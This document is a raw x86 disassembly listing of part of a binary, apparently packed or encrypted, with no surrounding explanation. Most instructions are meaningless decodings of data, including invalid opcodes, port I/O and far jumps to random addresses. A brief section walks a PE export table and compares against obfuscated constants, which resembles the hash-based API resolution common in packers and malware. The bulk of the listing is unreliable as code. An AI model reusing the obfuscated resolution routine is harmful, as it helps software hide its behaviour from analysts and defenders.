  4162c9:	xchg   ebp,eax
  4162ca:	or     eax,esi
  4162cc:	push   ss
  4162cd:	mov    eax,ds:0xee7af43c
  4162d2:	call   0xc972dc9d
  4162d7:	dec    ecx
  4162d8:	xchg   BYTE PTR [ecx-0x2ee9d23a],al
  4162de:	pop    esp
  4162df:	mov    dl,0xb
  4162e1:	add    BYTE PTR [ebp-0x42d289f8],0xbb
  4162e8:	add    BYTE PTR [esi],dh
  4162ea:	pop    ecx
  4162eb:	push   esp
  4162ec:	push   edx
  4162ed:	enter  0x8631,0xca
  4162f1:	retf   
  4162f2:	mov    ch,0x7f
  4162f4:	xchg   ecx,eax
  4162f5:	cmp    DWORD PTR ds:0x8626f27f,ebx
  4162fb:	pop    esi
  4162fc:	jmp    0x53a8:0xb5cd8d76
  416303:	pop    ds
  416304:	adc    DWORD PTR [ebx-0xf43a3cd],edx
  41630a:	in     eax,dx
  41630b:	mov    dh,0x48
  41630d:	xchg   ebp,ebx
  41630f:	xchg   cl,dh
  416311:	mov    eax,0x710e367d
  416316:	test   BYTE PTR [eax+0x3504964d],bh
  41631c:	sbb    dl,BYTE PTR [eax+0x22]
  41631f:	iret   
  416320:	xlat   BYTE PTR ds:[ebx]
  416321:	push   esi
  416322:	and    BYTE PTR [esi+0x24],ch
  416325:	xchg   edx,eax
  416326:	into   
  416327:	push   ebx
  416328:	out    0x4e,eax
  41632a:	pushf  
  41632b:	rsqrtps xmm5,XMMWORD PTR [edx+0x71]
  41632f:	mov    ah,0x5f
  416331:	cmp    cl,BYTE PTR [eax+0x3b]
  416334:	adc    DWORD PTR [ebp+0x1a],esi
  416337:	enter  0x8e5c,0xc9
  41633b:	cmc    
  41633c:	xor    al,0x17
  41633e:	pusha  
  41633f:	scas   eax,DWORD PTR es:[edi]
  416340:	popw   ss
  416342:	jo     0x4162ff
  416344:	xchg   esi,eax
  416345:	repz lahf 
  416347:	mov    ecx,0x45724c64
  41634c:	(bad)  
  41634d:	push   esi
  41634e:	mov    esp,0xe000ca43
  416353:	mov    DWORD PTR [edx+0x13],edx
  416356:	dec    ah
  416358:	imul   ebp,ebp,0xffffff94
  41635b:	pop    esp
  41635c:	ins    DWORD PTR es:[edi],dx
  41635d:	cmp    ebp,DWORD PTR [esi+0x7f3766d1]
  416363:	test   BYTE PTR [ebx],0x22
  416366:	mov    eax,ds:0xe3a6bef3
  41636b:	out    0x17,eax
  41636d:	mov    edi,0x437e1d58
  416372:	int3   
  416373:	outs   dx,BYTE PTR es:[esi]
  416375:	ins    BYTE PTR es:[edi],dx
  416376:	in     al,dx
  416377:	push   edx
  416378:	fild   DWORD PTR gs:[ebx]
  41637b:	xchg   ebx,eax
  41637c:	jnp    0x416379
  41637e:	(bad)  
  41637f:	(bad)  
  416380:	mov    ecx,0xd2241cc2
  416385:	mov    WORD PTR [ebx+edi*2],cs
  416388:	and    esi,esi
  41638a:	lock icebp 
  41638c:	popa   
  41638d:	xor    edi,DWORD PTR [ebp-0x4f3d4d84]
  416393:	jno    0x416329
  416395:	rcl    bh,1
  416397:	sub    dh,BYTE PTR [edx+ebx*1]
  41639a:	xor    al,bl
  41639c:	or     edx,DWORD PTR [edx]
  41639e:	popf   
  41639f:	pop    ebx
  4163a0:	mov    ebp,0xda47e487
  4163a5:	add    BYTE PTR [esi-0x31],bl
  4163a8:	rol    BYTE PTR [ebx],cl
  4163aa:	adc    edx,DWORD PTR [esi]
  4163ac:	fsubr  DWORD PTR [esi+0x3]
  4163af:	stos   DWORD PTR es:[edi],eax
  4163b0:	dec    esi
  4163b1:	in     al,dx
  4163b2:	aas    
  4163b3:	add    esp,DWORD PTR [ebx]
  4163b5:	retf   
  4163b6:	sbb    dl,dh
  4163b8:	xchg   edx,eax
  4163b9:	pop    edx
  4163ba:	adc    bl,ah
  4163bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163bd:	mov    cl,0xb7
  4163bf:	and    DWORD PTR [eax+edx*1+0x3b0d88a9],esi
  4163c6:	and    bh,BYTE PTR [edx-0x39434469]
  4163cc:	or     bh,bl
  4163ce:	ins    DWORD PTR es:[edi],dx
  4163cf:	repz sub ch,BYTE PTR [eax+0x64c66524]
  4163d6:	and    al,0x10
  4163d8:	or     edx,DWORD PTR [edi+ebp*2+0x2c7fe888]
  4163df:	dec    esp
  4163e0:	push   ebx
  4163e1:	adc    DWORD PTR [ebp+0x6c],ebx
  4163e4:	(bad)
  4163e7:	push   eax
  4163e8:	push   0x5e6b2692
  4163ed:	out    dx,eax
  4163ee:	ins    BYTE PTR es:[edi],dx
  4163ef:	push   eax
  4163f0:	xor    al,0x46
  4163f2:	scas   eax,DWORD PTR es:[edi]
  4163f3:	lea    esp,[edi]
  4163f5:	test   al,0x87
  4163f7:	fimul  DWORD PTR [ecx]
  4163f9:	add    eax,0xd4b0966b
  4163fe:	sti    
  4163ff:	and    al,0x12
  416401:	mov    edi,0x95171e1e
  416406:	cmp    eax,0xdcad52c0
  41640b:	pop    ebp
  41640c:	cmp    eax,0x91889cf4
  416411:	outs   dx,DWORD PTR ds:[esi]
  416412:	les    esp,FWORD PTR [eax+0x4aff797]
  416418:	mov    esp,0x6ce58c47
  41641d:	es xchg ebp,eax
  41641f:	ja     0x416425
  416421:	or     al,0xc5
  416423:	dec    ebp
  416424:	sbb    al,0x33
  416426:	std    
  416427:	int    0x28
  416429:	jmp    0x4f58:0x3f32048b
  416430:	sbb    eax,0xa498102e
  416435:	lea    edx,ds:[eax]
  416438:	or     ebp,DWORD PTR [esi-0x4da3010e]
  41643e:	adc    eax,0xc40b5078
  416443:	inc    edx
  416444:	test   eax,esp
  416446:	in     al,0xf2
  416448:	aas    
  416449:	outs   dx,BYTE PTR ds:[esi]
  41644a:	rcl    edx,0xfc
  41644d:	xchg   BYTE PTR [edx-0x55],bl
  416450:	daa    
  416451:	inc    eax
  416452:	mov    esi,DWORD PTR ss:[ebx-0x50e44dfd]
  416459:	cmp    ebp,DWORD PTR [edi+0x29]
  41645c:	nop
  41645d:	jp     0x416484
  41645f:	test   eax,0x5f66d3e9
  416464:	mov    eax,0xb2b85595
  416469:	add    eax,0xf358653
  41646e:	lahf   
  41646f:	sahf   
  416470:	adc    BYTE PTR [edi-0x404253ae],ah
  416476:	jl     0x4164eb
  416478:	xor    eax,0x7892048f
  41647d:	es int 0x91
  416480:	ffreep st(6)
  416482:	aad    0x3f
  416484:	jmp    0xe48515e1
  416489:	into   
  41648a:	fld    QWORD PTR [esi-0x634572ff]
  416490:	es jmp 0x4c444d0a
  416496:	xor    DWORD PTR [ebx-0x3b],eax
  416499:	xor    eax,0xbcff2a24
  41649e:	dec    ebx
  41649f:	push   edx
  4164a0:	sbb    bh,BYTE PTR [eax+0x71]
  4164a3:	dec    esi
  4164a4:	mov    al,0xba
  4164a6:	ins    BYTE PTR es:[edi],dx
  4164a7:	sbb    ah,bh
  4164a9:	out    0x31,al
  4164ab:	mov    edi,0xd704b6c6
  4164b0:	test   eax,0x81222e81
  4164b5:	or     ch,ah
  4164b7:	mov    al,ds:0x2d9638fa
  4164bc:	and    dl,ah
  4164be:	pop    eax
  4164bf:	retf   
  4164c0:	push   edi
  4164c1:	fld    TBYTE PTR [ebp+0x66]
  4164c4:	add    BYTE PTR [ecx-0x57],ah
  4164c7:	xor    eax,0xb27e97c9
  4164cc:	mov    esp,0x156c81ff
  4164d1:	les    ebp,FWORD PTR [edx-0x25250e79]
  4164d7:	out    0xd3,eax
  4164d9:	cli    
  4164da:	inc    ebp
  4164db:	cmp    DWORD PTR [ebx+0x5fa2eefa],0xffffff81
  4164e2:	xchg   esi,eax
  4164e3:	scas   eax,DWORD PTR es:[edi]
  4164e4:	es xchg ebp,eax
  4164e6:	sar    DWORD PTR [ecx+0x5e],1
  4164e9:	aad    0x66
  4164eb:	rcl    DWORD PTR [ebp+ecx*2+0x20fdc8cf],1
  4164f2:	sub    eax,0xc8bf74b0
  4164f7:	sar    BYTE PTR [eax+0x6c],0x2e
  4164fb:	xor    edi,DWORD PTR [ebx]
  4164fd:	(bad)  
  4164fe:	iret   
  4164ff:	imul   ecx,DWORD PTR [esi+esi*2+0x51],0xffffffec
  416504:	inc    esp
  416505:	fidivr DWORD PTR [esp+ecx*1]
  416508:	mov    WORD PTR [edx],ds
  41650a:	jne    0x4164e8
  41650c:	lods   al,BYTE PTR ds:[esi]
  41650d:	inc    esp
  41650e:	inc    esp
  41650f:	sbb    BYTE PTR ds:0x265c7b0,0x9
  416516:	cmp    eax,ebx
  416518:	dec    esp
  416519:	jle    0x4164ef
  41651b:	cmp    BYTE PTR [ebp+esi*2-0x4178dfa8],cl
  416522:	mov    ds:0x1e946cce,al
  416527:	(bad)  
  416528:	sub    al,0xfe
  41652a:	mov    ?,WORD PTR [ebp-0x782fb892]
  416530:	fst    DWORD PTR [edx-0x26]
  416533:	push   0xffffffac
  416535:	dec    ecx
  416536:	test   al,0xca
  416538:	cli    
  416539:	out    0xba,eax
  41653b:	ss mov bh,0x39
  41653e:	dec    edi
  41653f:	mov    ds:0xa6578dbe,eax
  416544:	add    BYTE PTR [eax+0x5c],0xa1
  416548:	dec    eax
  416549:	retf   0x2c35
  41654c:	add    dl,BYTE PTR [esi-0x31]
  41654f:	stos   BYTE PTR es:[edi],al
  416550:	push   ebx
  416551:	or     ch,dh
  416553:	out    0xaf,eax
  416555:	xchg   esp,eax
  416556:	add    eax,DWORD PTR [edi+0xa20d564]
  41655c:	bound  edx,QWORD PTR [eax]
  41655e:	dec    edx
  41655f:	dec    edx
  416560:	lahf   
  416561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416562:	iret   
  416563:	fs in  eax,0xfa
  416566:	inc    esp
  416567:	out    dx,al
  416568:	arpl   WORD PTR [edx-0x655aa45],bp
  41656e:	mov    ds:0x194a9d00,al
  416573:	shr    DWORD PTR ds:0x36861813,cl
  416579:	aam    0x75
  41657b:	shl    DWORD PTR [eax],0x52
  41657e:	or     BYTE PTR [esi],dl
  416580:	(bad)
  416584:	mov    edx,DWORD PTR [edx+eax*4+0x7a]
  416588:	fs dec esi
  41658a:	rcl    BYTE PTR [ebp-0x3ef939cd],cl
  416590:	xchg   edx,eax
  416591:	pop    ss
  416592:	dec    esp
  416593:	xlat   BYTE PTR ds:[ebx]
  416594:	fmul   st,st(3)
  416596:	pop    ebp
  416597:	jp     0x416521
  416599:	fstp   QWORD PTR ds:0xf0ca489c
  41659f:	inc    edi
  4165a0:	jbe    0x4165a4
  4165a2:	fs ins BYTE PTR es:[edi],dx
  4165a4:	inc    esp
  4165a5:	cmp    BYTE PTR [edi],ah
  4165a7:	xor    ebp,edx
  4165a9:	inc    edi
  4165aa:	ror    ah,1
  4165ac:	xlat   BYTE PTR ds:[ebx]
  4165ad:	addr16 push 0xf782f0c1
  4165b3:	retf   
  4165b4:	jmp    0x9a463717
  4165b9:	sahf   
  4165ba:	jb     0x4165ae
  4165bc:	dec    ebp
  4165bd:	popa   
  4165be:	ret    
  4165bf:	jge    0x4165db
  4165c1:	jmp    0xf084:0xf20b4000
  4165c8:	fadd   st,st(2)
  4165ca:	xor    al,0x40
  4165cc:	push   0x24
  4165ce:	fdiv   QWORD PTR [edx]
  4165d0:	pop    edi
  4165d1:	push   es
  4165d2:	pop    ebp
  4165d3:	test   DWORD PTR [esi-0x6d],edi
  4165d6:	mov    esp,DWORD PTR [ebx+esi*1+0x3e51b9f3]
  4165dd:	pop    ds
  4165de:	stos   BYTE PTR es:[edi],al
  4165df:	xor    esp,edx
  4165e1:	retf   0xe096
  4165e4:	call   0x7f8fb720
  4165e9:	arpl   ax,dx
  4165eb:	scas   eax,DWORD PTR es:[edi]
  4165ec:	and    DWORD PTR [ecx],esp
  4165ee:	lock test BYTE PTR [ecx],bh
  4165f1:	or     al,dl
  4165f3:	(bad)  
  4165f4:	inc    DWORD PTR [eax+0x1a271d6d]
  4165fa:	jne    0x416622
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    bl,bl
  416673:	push   ds
  416674:	test   eax,0x6123db86
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	cmp    al,0x45
  416680:	into   
  416681:	mov    al,0xf6
  416683:	mov    ecx,0xdba857a2
  416688:	mov    bh,dh
  41668a:	aam    0xa2
  41668c:	mul    DWORD PTR [ebx-0x5d135a34]
  416692:	xor    ah,0x72
  416695:	(bad)  
  416696:	mov    edx,0x926caf8b
  41669b:	adc    DWORD PTR [ecx],0xffffffbb
  41669e:	imul   cl
  4166a0:	int    0x1d
  4166a2:	push   cs
  4166a3:	push   0x5ba3bf8c
  4166a8:	mov    ch,0xce
  4166aa:	mov    ecx,0x11c914f1
  4166af:	sbb    eax,0xcb68ae6b
  4166b4:	cmp    eax,0x53a50683
  4166b9:	push   esp
  4166ba:	ins    DWORD PTR es:[edi],dx
  4166bb:	loopne 0x416726
  4166bd:	call   0xe35a4418
  4166c2:	push   esp
  4166c3:	jae    0x41672d
  4166c5:	push   ebx
  4166c6:	imul   ecx,DWORD PTR [ecx-0x10],0x50
  4166ca:	cmp    al,BYTE PTR [ebp-0x71]
  4166cd:	pop    ebx
  4166ce:	jns    0x41666d
  4166d0:	rol    BYTE PTR [edx+0x38],1
  4166d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166d4:	sbb    al,0xc3
  4166d6:	push   ebp
  4166d7:	or     ecx,DWORD PTR [ecx-0x40f51f4c]
  4166dd:	mov    bl,0xaf
  4166df:	xchg   ebp,eax
  4166e0:	or     eax,DWORD PTR [eax]
  4166e2:	or     al,0x7c
  4166e4:	ror    DWORD PTR [eax+eax*8-0x1a],1
  4166e8:	mov    edx,0xfea59fbb
  4166ed:	add    al,0x6
  4166ef:	cli    
  4166f0:	aas    
  4166f1:	or     eax,0xda66104e
  4166f6:	push   edx
  4166f7:	mov    ah,0x4b
  4166f9:	mov    al,0x74
  4166fb:	mov    ch,0xbe
  4166fd:	jnp    0x416685
  4166ff:	push   0x45
  416701:	mov    ch,0x5e
  416703:	xchg   edi,eax
  416704:	jne    0x416767
  416706:	xchg   DWORD PTR [edi],eax
  416708:	pop    edi
  416709:	fwait
  41670a:	mov    ah,0xe
  41670c:	cmp    eax,0x1cf85fde
  416711:	push   0x48
  416713:	sbb    bl,dl
  416715:	neg    BYTE PTR [ecx]
  416717:	sub    edi,eax
  416719:	test   eax,0xe9e50c07
  41671e:	cmc    
  41671f:	sub    eax,0x63aaa41f
  416724:	push   esp
  416725:	iret   
  416726:	jle    0x416794
  416728:	mov    bl,0xdd
  41672a:	add    dl,BYTE PTR [edx-0x341bc441]
  416730:	rcl    DWORD PTR [ebx+0x39e91a07],cl
  416736:	pusha  
  416737:	neg    al
  416739:	mov    es,WORD PTR [ecx]
  41673b:	ret    0xeb64
  41673e:	sbb    al,0x60
  416740:	mov    ss,WORD PTR [esi]
  416742:	cdq    
  416743:	add    edi,ecx
  416745:	mov    ebp,0x18ce0222
  41674a:	cdq    
  41674b:	pop    ebx
  41674c:	pop    ecx
  41674d:	mov    WORD PTR [edx+0x40],cs
  416750:	daa    
  416751:	xor    DWORD PTR [eax],esi
  416753:	adc    DWORD PTR [ecx-0x52],eax
  416756:	call   0x836cac08
  41675b:	in     eax,dx
  41675c:	out    dx,al
  41675d:	in     eax,dx
  41675e:	in     al,dx
  41675f:	pusha  
  416760:	sbb    ah,dl
  416762:	mov    eax,ds:0x3bfe63
  416767:	mov    ah,0x80
  416769:	lds    edi,FWORD PTR [edi-0x3efab730]
  41676f:	add    al,0xda
  416771:	xor    dh,BYTE PTR [esi+0x14b31e84]
  416777:	inc    edi
  416778:	mov    dl,0x95
  41677a:	pop    esp
  41677b:	or     al,0xd3
  41677d:	mov    al,0x81
  41677f:	ins    DWORD PTR es:[edi],dx
  416780:	xchg   ecx,eax
  416781:	xchg   edx,eax
  416782:	pop    esi
  416783:	ds pusha 
  416785:	pusha  
  416786:	neg    BYTE PTR [esi-0x704b910a]
  41678c:	adc    al,0x25
  41678e:	pop    edx
  41678f:	jns    0x416790
  416791:	jmp    0x41674c
  416793:	dec    edi
  416794:	push   0x4a1a3146
  416799:	sub    eax,0xc5d6e87a
  41679e:	es mov esp,0x92166779
  4167a4:	sbb    al,0xaf
  4167a6:	adc    BYTE PTR [edx],0x4b
  4167a9:	ficomp DWORD PTR [ecx+0x596ae65]
  4167af:	inc    edi
  4167b0:	or     al,0x3
  4167b2:	sbb    eax,0x88a90cb
  4167b7:	mov    ebp,0x3c444819
  4167bc:	je     0x416740
  4167be:	sbb    al,0x99
  4167c0:	ins    BYTE PTR es:[edi],dx
  4167c1:	inc    esp
  4167c2:	ins    BYTE PTR es:[edi],dx
  4167c3:	xchg   esp,eax
  4167c4:	(bad)  
  4167c5:	outs   dx,DWORD PTR ds:[esi]
  4167c6:	jmp    0xf3aa5672
  4167cb:	(bad)  
  4167cc:	stc    
  4167cd:	add    bl,BYTE PTR [esi-0x72]
  4167d0:	fild   WORD PTR [edx+0x20]
  4167d3:	call   0xb1c4:0x8de69b1a
  4167da:	inc    dl
  4167dc:	adc    ebp,DWORD PTR [esp+edx*4]
  4167df:	sbb    ebp,DWORD PTR [ebx]
  4167e1:	mov    ds:0xd2ec9777,eax
  4167e6:	inc    esi
  4167e7:	xor    eax,0xabc661ec
  4167ec:	fcom   QWORD PTR [ebx]
  4167ee:	jmp    0x59b2:0xf5001ddd
  4167f5:	repnz push cs
  4167f7:	add    eax,0x47ef6403
  4167fc:	push   es
  4167fd:	dec    esi
  4167fe:	loope  0x4167b8
  416800:	dec    ebx
  416801:	aad    0xf2
  416803:	sub    eax,ebx
  416805:	rcl    DWORD PTR [ebx],0x98
  416808:	jl     0x41687c
  41680a:	add    eax,eax
  41680c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41680d:	(bad)  [ebx]
  41680f:	in     al,dx
  416810:	jl     0x416816
  416812:	shl    DWORD PTR [ebx],1
  416814:	mov    edi,0x26121721
  416819:	sub    BYTE PTR [eax-0x7d],al
  41681c:	jb     0x416823
  41681e:	and    BYTE PTR [eax-0x2a],al
  416821:	lods   al,BYTE PTR ds:[esi]
  416822:	cmp    BYTE PTR [edx+0x51440fb1],0x48
  416829:	mul    DWORD PTR [edx+0x5c]
  41682c:	out    0xaf,al
  41682e:	pop    ebp
  41682f:	jmp    0x95ac4472
  416834:	pop    eax
  416835:	jb     0x416819
  416837:	(bad)
  41683a:	dec    eax
  41683b:	enter  0x74b0,0xdf
  41683f:	push   edi
  416840:	ss push edi
  416842:	sbb    bl,BYTE PTR ds:0x31f41b13
  416848:	cmp    dh,bh
  41684a:	pop    esp
  41684b:	enter  0xdad1,0x65
  41684f:	ins    BYTE PTR es:[edi],dx
  416850:	rcl    bl,cl
  416852:	push   ss
  416853:	or     esp,edi
  416855:	mov    al,ds:0x8a165d52
  41685a:	cwde   
  41685b:	push   edx
  41685c:	mov    dl,0xf2
  41685e:	jecxz  0x416881
  416860:	push   ss
  416861:	mov    ebx,DWORD PTR [ecx-0x28]
  416864:	or     BYTE PTR [ecx+ebx*8+0x46],0xbd
  416869:	inc    ebx
  41686a:	cwde   
  41686b:	stos   DWORD PTR es:[edi],eax
  41686c:	(bad)  
  41686d:	mov    ds:0x3904c730,al
  416872:	mov    edi,DWORD PTR [eax-0x4a]
  416875:	cli    
  416876:	and    eax,0x27ce4240
  41687b:	and    al,0xc8
  41687d:	pushf  
  41687e:	mov    ds:0x8f434adc,eax
  416883:	add    BYTE PTR [ebx+0x37],dh
  416886:	arpl   WORD PTR [ecx],di
  416888:	jbe    0x4168d9
  41688a:	xor    bl,BYTE PTR [ebp+0xabe377e]
  416890:	dec    edx
  416891:	(bad)  
  416892:	in     al,dx
  416893:	pop    ds
  416894:	push   ss
  416895:	cmp    ebx,ebp
  416897:	or     al,0xbf
  416899:	or     dl,BYTE PTR [ecx+eax*1-0x68]
  41689d:	cmp    eax,esp
  41689f:	push   edi
  4168a0:	hlt    
  4168a1:	push   edx
  4168a2:	dec    ecx
  4168a3:	jmp    0x1e59:0x86410ecb
  4168aa:	sbb    DWORD PTR [ecx],eax
  4168ac:	jns    0x4168c6
  4168ae:	call   0xb2fb2db7
  4168b3:	xor    BYTE PTR [ebx],cl
  4168b5:	and    al,0x1b
  4168b7:	mov    ds:0xe1f7e37d,al
  4168bc:	je     0x4168b7
  4168be:	xchg   edi,eax
  4168bf:	cs push ecx
  4168c1:	jne    0x416846
  4168c3:	dec    edx
  4168c4:	mov    eax,DWORD PTR [edi]
  4168c6:	adc    al,0x43
  4168c8:	call   0xf2eb9b7c
  4168cd:	sbb    BYTE PTR [ebx+0xd],cl
  4168d0:	mov    ah,0xb1
  4168d2:	mov    WORD PTR [edx+0x26b931b3],ss
  4168d8:	test   eax,0xa292a057
  4168dd:	push   esp
  4168de:	cmp    BYTE PTR [eax+0x40],dl
  4168e1:	cld    
  4168e2:	add    esp,esi
  4168e4:	mov    edi,0xf7cde336
  4168e9:	mov    BYTE PTR [edi],bh
  4168eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ec:	adc    esp,DWORD PTR [ebx+ebx*1]
  4168ef:	std    
  4168f0:	retf   
  4168f1:	dec    edi
  4168f2:	int3   
  4168f3:	dec    edi
  4168f4:	je     0x416927
  4168f6:	stos   DWORD PTR es:[edi],eax
  4168f7:	in     al,0x90
  4168f9:	hlt    
  4168fa:	xchg   esi,eax
  4168fb:	aad    0x33
  4168fd:	sbb    ebx,ebx
  4168ff:	adc    ebx,DWORD PTR [ecx-0x26]
  416902:	pop    esp
  416903:	xor    BYTE PTR [eax],ch
  416905:	fcmovnu st,st(3)
  416907:	test   al,0xaf
  416909:	sub    DWORD PTR [edx],esp
  41690b:	mov    ch,BYTE PTR ds:0x65a4153b
  416911:	ss std 
  416913:	inc    edx
  416914:	mov    eax,0x5070d4e3
  416919:	jmp    0x1904:0xede76dff
  416920:	and    ah,BYTE PTR [ecx]
  416922:	fcomp  QWORD PTR [ecx+0x291d6ad5]
  416928:	cwde   
  416929:	xor    al,0xb
  41692b:	bound  eax,QWORD PTR [edx+edi*4]
  41692e:	mov    DWORD PTR [ebx-0xa],ecx
  416931:	push   edi
  416932:	outs   dx,BYTE PTR ds:[esi]
  416933:	in     eax,0x70
  416935:	mov    ah,0x41
  416937:	and    DWORD PTR [edi],0x356f493b
  41693d:	inc    esp
  41693e:	test   DWORD PTR [edi-0x68],edx
  416941:	inc    esp
  416942:	push   ecx
  416943:	jmp    0x6dbf:0x666f2293
  41694a:	cwde   
  41694b:	push   eax
  41694c:	mov    esi,0xab8bdd9b
  416951:	mov    ch,0x4a
  416953:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416955:	xor    eax,0x84a27e75
  41695a:	mov    eax,0xdf96896b
  41695f:	inc    esp
  416960:	pop    ds
  416961:	bound  ebp,QWORD PTR [edx]
  416963:	enter  0x9a1a,0xa2
  416967:	pop    esp
  416968:	(bad)  [eax-0x76]
  41696b:	ror    eax,1
  41696d:	call   0x7454:0x6df7dc48
  416974:	inc    ah
  416976:	cs (bad) 
  416978:	push   0x1e
  41697a:	das    
  41697b:	mov    ch,0x50
  41697d:	pushf  
  41697e:	shl    BYTE PTR [edx-0x38455a9a],1
  416984:	add    edi,DWORD PTR [esi]
  416986:	mov    ebp,0x16a752e4
  41698b:	push   cs
  41698c:	sbb    DWORD PTR [edi+0x64],esi
  41698f:	cmc    
  416990:	call   0x274d:0xdd70db1e
  416997:	pop    edi
  416998:	jmp    0x416970
  41699a:	rol    BYTE PTR [edx+0x3bfb6cb],cl
  4169a0:	xor    esp,DWORD PTR [edx-0x491a8ab6]
  4169a6:	push   0x8632fd95
  4169ab:	into   
  4169ac:	sub    al,0x57
  4169ae:	jecxz  0x416978
  4169b0:	or     al,0xc7
  4169b2:	mov    ebx,0xd7d0915b
  4169b7:	inc    ecx
  4169b8:	loopne 0x4169b6
  4169ba:	xchg   ecx,eax
  4169bb:	pop    ecx
  4169bc:	mov    bl,0xb3
  4169be:	sbb    eax,0x59d89fb9
  4169c3:	sbb    DWORD PTR [edi],edi
  4169c5:	retf   0xd61e
  4169c8:	cmp    bl,BYTE PTR [eax]
  4169ca:	push   ss
  4169cb:	test   al,0x80
  4169ce:	repz xchg ebp,eax
  4169d0:	inc    edx
  4169d1:	retf   
  4169d2:	cs dec esi
  4169d4:	mov    WORD PTR [ebx],fs
  4169d6:	and    BYTE PTR [ebx-0x45],dl
  4169d9:	jp     0x416a00
  4169db:	xchg   BYTE PTR [esi-0x15],ah
  4169de:	loopne 0x41696f
  4169e0:	fwait
  4169e1:	es (bad) 
  4169e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169e4:	shr    bh,cl
  4169e6:	inc    ebp
  4169e7:	jmp    0x416a3c
  4169e9:	inc    esp
  4169ea:	pop    es
  4169eb:	pop    edi
  4169ec:	and    DWORD PTR [ebp+0x146e2064],0xfe06ba73
  4169f6:	popa   
  4169f7:	add    eax,0x5d6d9ac2
  4169fc:	cmp    edi,DWORD PTR ds:0xe935887e
  416a02:	xchg   edi,eax
  416a03:	imul   edi,DWORD PTR [esi-0x3849c211],0x37496668
  416a0d:	out    dx,eax
  416a0e:	nop
  416a0f:	outs   dx,BYTE PTR ds:[esi]
  416a10:	sar    BYTE PTR [esp+esi*2+0x69b32d77],0xa7
  416a18:	xchg   edx,eax
  416a19:	ret    
  416a1a:	ror    ebx,0xc9
  416a1d:	inc    edi
  416a1e:	bound  edx,QWORD PTR [eax+0x76267a3d]
  416a24:	xchg   DWORD PTR [ecx-0x14],ebx
  416a27:	xchg   edx,eax
  416a28:	cld    
  416a29:	jo     0x416a5f
  416a2b:	cdq    
  416a2c:	aad    0x57
  416a2e:	xlat   BYTE PTR ds:[ebx]
  416a2f:	or     al,0x68
  416a31:	fs mov dh,0x68
  416a34:	pop    es
  416a35:	mov    esp,0x7e8cd2b8
  416a3a:	inc    ebp
  416a3b:	jb     0x416aa2
  416a3d:	stc    
  416a3e:	out    dx,eax
  416a3f:	jge    0x4169f2
  416a41:	in     al,dx
  416a42:	ror    BYTE PTR ds:0x7ac08989,1
  416a48:	mov    eax,ds:0xa9e533a3
  416a4d:	jl     0x416a92
  416a4f:	adc    eax,0xe4a82af4
  416a54:	mov    al,0x51
  416a56:	xchg   edx,eax
  416a57:	ss xchg ebx,eax
  416a59:	mov    ds:0x7ff91621,al
  416a5e:	dec    BYTE PTR [ebx]
  416a60:	xchg   ebx,eax
  416a61:	xor    edi,edx
  416a63:	mov    esi,0xdad28791
  416a68:	sbb    eax,0xf3b34987
  416a6d:	loope  0x416a29
  416a6f:	int    0xbc
  416a71:	mov    edi,0x9fb19f03
  416a76:	sbb    al,0x8c
  416a78:	popa   
  416a79:	and    edi,ebx
  416a7b:	pop    esp
  416a7c:	std    
  416a7d:	mov    eax,ds:0x6289c8a4
  416a82:	mov    ebp,esp
  416a84:	adc    BYTE PTR [ebx-0x77],bh
  416a87:	add    eax,0x278a2370
  416a8c:	cld    
  416a8d:	sub    DWORD PTR [esi+0x2d],eax
  416a90:	loopne 0x416a60
  416a92:	mov    bh,0xca
  416a94:	pop    es
  416a95:	xchg   ebx,eax
  416a96:	in     al,0x55
  416a98:	jg     0x416a3e
  416a9a:	rcl    BYTE PTR [ecx-0x47],cl
  416a9d:	cdq    
  416a9e:	pop    esp
  416a9f:	pusha  
  416aa0:	and    BYTE PTR [ebx+esi*4],cl
  416aa3:	xchg   edi,eax
  416aa4:	sub    esp,edi
  416aa6:	inc    edi
  416aa7:	push   esp
  416aa8:	push   es
  416aa9:	scas   eax,DWORD PTR es:[edi]
  416aaa:	leave  
  416aab:	dec    ebx
  416aac:	call   0x1b5d24e4
  416ab1:	mov    ss,WORD PTR [ebx-0x2fceb35]
  416ab7:	(bad)  
  416ab8:	mov    edx,0x1dac8b0e
  416abd:	cmp    ebp,DWORD PTR [eax+0x68ed5a73]
  416ac3:	xchg   ecx,eax
  416ac4:	in     eax,dx
  416ac5:	sbb    eax,0x2aa118d2
  416aca:	push   esp
  416acb:	pop    edx
  416acc:	js     0x416a59
  416ace:	mov    bx,0x30fd
  416ad2:	jmp    0xc995:0xc046126e
  416ad9:	jbe    0x416a9d
  416adb:	retf   0xba95
  416ade:	adc    ah,dh
  416ae0:	mov    eax,0x22713a34
